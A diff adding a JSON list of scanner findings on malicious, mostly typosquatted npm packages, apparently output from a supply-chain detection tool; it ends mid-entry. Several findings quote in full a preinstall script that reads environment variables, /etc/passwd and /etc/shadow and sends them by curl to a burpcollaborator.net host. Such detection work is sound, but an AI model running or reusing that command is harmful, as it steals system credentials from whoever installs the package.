@@ -1,0 +1,3342 @@
+[
+  {
+    "package": "loadyml",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 16,
+    "message": "Potentially malicious install script in preinstall: \"node update.js\"."
+  },
+  {
+    "package": "loadyml",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "update.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "OS fingerprinting data exfiltration detected. Source: os.cpus() \u2192 Sink: b"
+  },
+  {
+    "package": "lodashs",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 16,
+    "message": "Potentially malicious install script in preinstall: \"node update.js && npm install electron\"."
+  },
+  {
+    "package": "lodashs",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "update.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "OS fingerprinting data exfiltration detected. Source: os.cpus() \u2192 Sink: b"
+  },
+  {
+    "package": "wafer-lightbox",
+    "version": "1.5.4",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "eogtktu.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "wafer-lightbox",
+    "version": "1.5.4",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node eogtktu.js\"."
+  },
+  {
+    "package": "wafer-lightbox",
+    "version": "1.5.4",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "eogtktu.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path '.' flows into sensitive operation"
+  },
+  {
+    "package": "elm-combine",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-elm-combine-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-elm-combine-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "elm-combine",
+    "version": "0.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-elm-combine-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-elm-combine-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "elm-combine",
+    "version": "2.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-elm-combine-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-elm-combine-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "elm-combine",
+    "version": "3.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-elm-combine-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-elm-combine-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "froever",
+    "version": "2.3.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./lib/timeservingness.js\"."
+  },
+  {
+    "package": "froever",
+    "version": "2.3.1",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "lib/timeservingness.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "mendiff",
+    "version": "2.0.1",
+    "label": "malicious",
+    "query": "obfuscated-execution-risk",
+    "file": "index.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Obfuscated Execution Risk: Encoded data flows from `Buffer. ... 09,32])` to `Buffer. ... ilename"
+  },
+  {
+    "package": "mendiff",
+    "version": "2.0.1",
+    "label": "malicious",
+    "query": "reverse-shell-obfuscated-exec",
+    "file": "index.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Malicious execution of data from $@.[101,99 ... 109,32]this source"
+  },
+  {
+    "package": "yeoman-genrator",
+    "version": "3.1.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./nonpsychologic.js\"."
+  },
+  {
+    "package": "yeoman-genrator",
+    "version": "3.1.1",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "nonpsychologic.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "prerequests-xcode",
+    "version": "1.0.4",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "index.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "prerequests-xcode",
+    "version": "1.0.4",
+    "label": "malicious",
+    "query": "credential-harvest-exfil",
+    "file": null,
+    "startLine": null,
+    "endLine": null,
+    "message": null
+  },
+  {
+    "package": "prerequests-xcode",
+    "version": "1.0.4",
+    "label": "malicious",
+    "query": "reverse-shell-obfuscated-exec",
+    "file": "index.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Malicious execution of data from $@.['\\x5cA ... 'city']this source"
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 17,
+    "message": "Potentially malicious install script in preinstall: \"node script/prei.js\"."
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "script/prei.js",
+    "startLine": 9,
+    "endLine": 16,
+    "message": "Source path './preinstall.js' flows into sensitive operation"
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "script/prei.js",
+    "startLine": 10,
+    "endLine": 16,
+    "message": "Source path p flows into sensitive operation"
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "script/prei.js",
+    "startLine": 16,
+    "endLine": 16,
+    "message": "Source path node  flows into sensitive operation"
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 17,
+    "message": "Potentially malicious install script in preinstall: \"node script/prei.js\"."
+  },
+  {
+    "package": "hulp",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"sh build.sh &\"."
+  },
+  {
+    "package": "wafer-image",
+    "version": "1.2.2",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "hsxmjio.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "wafer-image",
+    "version": "1.2.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node hsxmjio.js\"."
+  },
+  {
+    "package": "wafer-image",
+    "version": "1.2.2",
+    "label": "malicious",
+    "query": "credential-harvest-exfil",
+    "file": null,
+    "startLine": null,
+    "endLine": null,
+    "message": null
+  },
+  {
+    "package": "wafer-image",
+    "version": "1.2.2",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "hsxmjio.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path Buffer[ ... 18d)])) flows into sensitive operation"
+  },
+  {
+    "package": "angluar-cli",
+    "version": "0.0.3",
+    "label": "malicious",
+    "query": "obfuscated-execution-risk",
+    "file": "post.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Obfuscated Execution Risk: Encoded data flows from `Buffer. ... 09,32])` to `Buffer. ... ilename"
+  },
+  {
+    "package": "angluar-cli",
+    "version": "0.0.3",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 16,
+    "message": "Potentially malicious install script in postinstall: \"node post.js\"."
+  },
+  {
+    "package": "angluar-cli",
+    "version": "0.0.3",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "post.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path __filename flows into sensitive operation"
+  },
+  {
+    "package": "angluar-cli",
+    "version": "0.0.3",
+    "label": "malicious",
+    "query": "reverse-shell-obfuscated-exec",
+    "file": "post.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Malicious execution of data from $@.[101,99 ... 109,32]this source"
+  },
+  {
+    "package": "angluar-cli",
+    "version": "0.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 16,
+    "message": "Potentially malicious install script in postinstall: \"node post.js\"."
+  },
+  {
+    "package": "angluar-cli",
+    "version": "0.0.2",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "post.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path console ... scii')) flows into sensitive operation"
+  },
+  {
+    "package": "soket.js",
+    "version": "1.9.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./hastile.js\"."
+  },
+  {
+    "package": "soket.js",
+    "version": "1.9.0",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "hastile.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "jqeury",
+    "version": "3.3.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./src/data/var/everted.js\"."
+  },
+  {
+    "package": "jqeury",
+    "version": "3.3.1",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "src/data/var/everted.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "wafer-bind",
+    "version": "1.1.2",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "kdoixna.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "wafer-bind",
+    "version": "1.1.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node kdoixna.js\"."
+  },
+  {
+    "package": "wafer-bind",
+    "version": "1.1.2",
+    "label": "malicious",
+    "query": "credential-harvest-exfil",
+    "file": null,
+    "startLine": null,
+    "endLine": null,
+    "message": null
+  },
+  {
+    "package": "wafer-bind",
+    "version": "1.1.2",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "kdoixna.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path Buffer[ ... env'])) flows into sensitive operation"
+  },
+  {
+    "package": "inter-soket",
+    "version": "single",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 18,
+    "message": "Potentially malicious install script in preinstall: \"node index.js\"."
+  },
+  {
+    "package": "inter-soket",
+    "version": "single",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "index.js",
+    "startLine": 6,
+    "endLine": 17,
+    "message": "Source path '/tmp/gutwise' flows into sensitive operation"
+  },
+  {
+    "package": "inter-soket",
+    "version": "single",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "index.js",
+    "startLine": 17,
+    "endLine": 17,
+    "message": "Source path PAYLOAD_PATH flows into sensitive operation"
+  },
+  {
+    "package": "plutov-slack-client",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 20,
+    "message": "Potentially malicious install script in postinstall: \"node install.js &\"."
+  },
+  {
+    "package": "plutov-slack-client",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path \"/bin/sh\" flows into sensitive operation"
+  },
+  {
+    "package": "soket.io",
+    "version": "2.1.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./lib/devenustate.js\"."
+  },
+  {
+    "package": "soket.io",
+    "version": "2.1.1",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "lib/devenustate.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "conventional-changelog",
+    "version": "1.2.0",
+    "label": "malicious",
+    "query": "reverse-shell-obfuscated-exec",
+    "file": "index.js",
+    "startLine": 5,
+    "endLine": 10,
+    "message": "Malicious execution of data from $@.\"cm0gLX ... wgJg==\"this source"
+  },
+  {
+    "package": "wafer-toggle",
+    "version": "1.15.4",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node ncxogsz.js\"."
+  },
+  {
+    "package": "colors_express",
+    "version": "1.4.5",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "lib/colors.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "colors_express",
+    "version": "1.4.5",
+    "label": "malicious",
+    "query": "credential-harvest-exfil",
+    "file": null,
+    "startLine": null,
+    "endLine": null,
+    "message": null
+  },
+  {
+    "package": "colors_express",
+    "version": "1.4.5",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/colors.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path process ... 0x1ab)] flows into sensitive operation"
+  },
+  {
+    "package": "browserift",
+    "version": "16.2.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 14,
+    "message": "Potentially malicious install script in preinstall: \"sh build.sh &\"."
+  },
+  {
+    "package": "electorn",
+    "version": "10.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 17,
+    "message": "Potentially malicious install script in preinstall: \"node update.js &\"."
+  },
+  {
+    "package": "electorn",
+    "version": "10.0.0",
+    "label": "malicious",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "update.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "OS fingerprinting data exfiltration detected. Source: os.cpus() \u2192 Sink: b"
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 82,
+    "message": "Potentially malicious install script in postinstall: \"node postinstall.js\"."
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.3",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 82,
+    "message": "Potentially malicious install script in postinstall: \"node postinstall.js\"."
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 82,
+    "message": "Potentially malicious install script in postinstall: \"node postinstall.js\"."
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "postinstall.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path new _0x ... 0x59b7) flows into sensitive operation"
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.5",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 82,
+    "message": "Potentially malicious install script in postinstall: \"node postinstall.js\"."
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.5",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "postinstall.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path new _0x ... 0x1efa) flows into sensitive operation"
+  },
+  {
+    "package": "com.google.play.comon",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-com.google.play.comon-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-com.google.play.comon-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "com.google.play.comon",
+    "version": "2.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-com.google.play.comon-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-com.google.play.comon-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "com.google.play.comon",
+    "version": "3.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-com.google.play.comon-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-com.google.play.comon-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "regenraotr",
+    "version": "6.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./windpipe.js\"."
+  },
+  {
+    "package": "regenraotr",
+    "version": "6.0.0",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "windpipe.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "wafer-form",
+    "version": "1.30.1",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "vinlcym.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "wafer-form",
+    "version": "1.30.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node vinlcym.js\"."
+  },
+  {
+    "package": "wafer-form",
+    "version": "1.30.1",
+    "label": "malicious",
+    "query": "credential-harvest-exfil",
+    "file": null,
+    "startLine": null,
+    "endLine": null,
+    "message": null
+  },
+  {
+    "package": "wafer-form",
+    "version": "1.30.1",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "vinlcym.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path '.' flows into sensitive operation"
+  },
+  {
+    "package": "octavius-public",
+    "version": "1.836.609",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "pyenxxe.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "octavius-public",
+    "version": "1.836.609",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node pyenxxe.js\"."
+  },
+  {
+    "package": "octavius-public",
+    "version": "1.836.609",
+    "label": "malicious",
+    "query": "credential-harvest-exfil",
+    "file": null,
+    "startLine": null,
+    "endLine": null,
+    "message": null
+  },
+  {
+    "package": "require-ports",
+    "version": "10.4.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./leukocytic.js\"."
+  },
+  {
+    "package": "require-ports",
+    "version": "10.4.0",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "leukocytic.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "wafer-geolocation",
+    "version": "1.2.10",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "ckmhtfk.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "wafer-geolocation",
+    "version": "1.2.10",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node ckmhtfk.js\"."
+  },
+  {
+    "package": "wafer-geolocation",
+    "version": "1.2.10",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "ckmhtfk.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path Buffer[ ... ase64') flows into sensitive operation"
+  },
+  {
+    "package": "jquerz",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./lib/didactical.js\"."
+  },
+  {
+    "package": "jquerz",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "lib/didactical.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "wafer-caas",
+    "version": "1.14.20",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "dwxtysb.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "wafer-caas",
+    "version": "1.14.20",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node dwxtysb.js\"."
+  },
+  {
+    "package": "wafer-caas",
+    "version": "1.14.20",
+    "label": "malicious",
+    "query": "credential-harvest-exfil",
+    "file": null,
+    "startLine": null,
+    "endLine": null,
+    "message": null
+  },
+  {
+    "package": "wafer-caas",
+    "version": "1.14.20",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "dwxtysb.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path Buffer[ ... env'])) flows into sensitive operation"
+  },
+  {
+    "package": "pegleg_heart",
+    "version": "0.0.6",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in postinstall: \"chmod +x post_install.sh && ./post_install.sh\"."
+  },
+  {
+    "package": "pegleg_heart",
+    "version": "0.0.12",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in postinstall: \"chmod +x post_install.sh && ./post_install.sh\"."
+  },
+  {
+    "package": "http-proxy-middelware",
+    "version": "2.9.0",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "index.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "mrg-message-broker",
+    "version": "9998.987.376",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "botpssc.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "mrg-message-broker",
+    "version": "9998.987.376",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node botpssc.js\"."
+  },
+  {
+    "package": "colour-string",
+    "version": "1.5.3",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./adamantoblast.js\"."
+  },
+  {
+    "package": "colour-string",
+    "version": "1.5.3",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "adamantoblast.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "foever",
+    "version": "0.15.3",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./test/fixtures/otidia.js\"."
+  },
+  {
+    "package": "foever",
+    "version": "0.15.3",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "test/fixtures/otidia.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "foever",
+    "version": "0.15.3",
+    "label": "malicious",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/forever/worker.js",
+    "startLine": 48,
+    "endLine": 48,
+    "message": "OS fingerprinting data exfiltration detected. Source: process ... PROFILE \u2192 Sink: self.monitor.data"
+  },
+  {
+    "package": "foever",
+    "version": "0.15.3",
+    "label": "malicious",
+    "query": "os-fingerprinting-exfiltration",
